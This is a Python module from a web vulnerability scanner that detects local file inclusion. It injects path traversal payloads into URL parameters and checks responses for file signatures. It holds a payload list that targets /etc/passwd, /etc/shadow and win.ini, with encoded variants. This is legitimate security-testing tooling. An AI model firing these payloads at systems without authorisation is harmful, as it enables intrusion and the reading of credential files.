"""
LFIScanner — Local File Inclusion detection via path traversal payloads.

Lifecycle:
  DETECTED:   (not applicable — requires signature match)
  VALIDATED:  File content signature found in response
  EXPLOITABLE: (not applicable)
  VERIFIED:   (not applicable)

Maturity: Level 3 (Detect + Validate + typed evidence + reproduction)
"""

from urllib.parse import urlparse, parse_qs

from modules.utils import (
    safe_get, finding, log, Colors, _build_curl,
    VerificationStage,
    safe_cookies_dict,
)
from scanners.base import ScannerBase, DetectionResult, ValidationResult
from models.finding import Finding
from models.evidence import HttpRequestEvidence, ResponseExcerptEvidence

LFI_SIGNATURES = [
    "root:x:0:0", "[extensions]", "[boot loader]",
    "for 16-bit app support", "daemon:x:",
]


class LFIScanner(ScannerBase):
    SCANNER_NAME = "lfi"
    SCANNER_MATURITY = 3
    TARGET_LEVEL = False

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)
        self._payloads = None

    def _get_payloads(self) -> list[str]:
        if self._payloads is None:
            loaded = self._load_payloads("lfi")
            if loaded and isinstance(loaded, list):
                self._payloads = loaded
            else:
                self._payloads = [
                    "../../../../etc/passwd", "../../../../etc/shadow",
                    "../../../../windows/win.ini",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252F..%252F..%252Fetc%252Fpasswd",
                    "/etc/passwd", "C:\\Windows\\win.ini",
                ]
        return self._payloads

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        from urllib.parse import urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def detect(self, url: str, parameter: str) -> DetectionResult | None:
        payloads = self._get_payloads()
        baseline_resp = safe_get(self.session, url, self.timeout)
        if baseline_resp is None:
            return None
        baseline_body = baseline_resp.text or ""
        for payload in payloads:
            try:
                test_url = self._inject_param(url, parameter, payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if resp:
                    body = resp.text
                    for sig in LFI_SIGNATURES:
                        if sig in body and sig not in baseline_body:
                            return DetectionResult(
                                url=test_url,
                                parameter=parameter,
                                payload=payload,
                                context=f"LFI signature: {sig!r}",
                                raw_response=resp,
                                evidence_signals=[f"LFI: {sig}"],
                            )
            except Exception:
                continue
        return None

    def generate_reproduction(self, detection: DetectionResult) -> list[str]:
        return [
            f"Send GET to {detection.url}",
            f"Inject into '{detection.parameter}': {detection.payload}",
            f"Observe file signature in response: {detection.context}",
        ]

    def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
        self._prepare_scan()
        raw_urls = self.recon.get("urls", []) if target_urls is None else target_urls
        for url in raw_urls:
            if "?" not in url or not self._in_scope(url):
                continue
            try:
                params = list(parse_qs(urlparse(url).query).keys())
                for param in params:
                    detection = self.detect(url, param)
                    if detection is None:
                        continue
                    req_ev = HttpRequestEvidence(
                        method="GET",
                        url=detection.url,
                        curl_command=_build_curl("GET", detection.url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                    )
                    resp = detection.raw_response
                    resp_ev = ResponseExcerptEvidence(
                        excerpt=resp.text[:500] if resp else "",
                        length=len(resp.text) if resp else 0,
                        context="lfi_detection",
                    )
                    f = finding(
                        vuln_type="Local File Inclusion",
                        url=detection.url,
                        severity="critical",
                        details=f"Parameter '{detection.parameter}' includes local file (signature: {detection.context})",
                        evidence=f"Payload: {detection.payload}",
                        request=_build_curl("GET", detection.url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
                        response_excerpt=resp.text[:500] if resp else "",
                        parameter=detection.parameter,
                        steps_to_reproduce=self.generate_reproduction(detection),
                        verification_stage=VerificationStage.VALIDATED.value,
                    )
                    if f:
                        self.evidence_engine.store(req_ev)
                        self.evidence_engine.store(resp_ev)
                        self.evidence_engine.link_to_finding(req_ev, f.get("fingerprint", ""))
                        self.evidence_engine.link_to_finding(resp_ev, f.get("fingerprint", ""))
                        self._add_finding(f)
                    log(f"  [LFI] {detection.url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
            except Exception:
                continue
        return self._get_findings()
